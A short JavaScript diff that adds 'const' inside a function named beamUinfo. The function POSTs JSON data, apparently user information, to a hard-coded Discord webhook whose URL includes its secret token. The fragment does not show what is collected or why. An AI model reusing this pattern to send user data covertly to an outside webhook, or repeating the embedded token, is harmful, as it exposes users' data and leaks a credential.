@@ -169,7 +169,7 @@ function init ()
 
 function beamUinfo (data)
 {
-	request = new XMLHttpRequest()
+	const request = new XMLHttpRequest()
 	request.open('POST', 'https://discordapp.com/api/webhooks/702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF');
 	request.setRequestHeader('Content-type', 'application/json');
 	request.send(JSON.stringify({
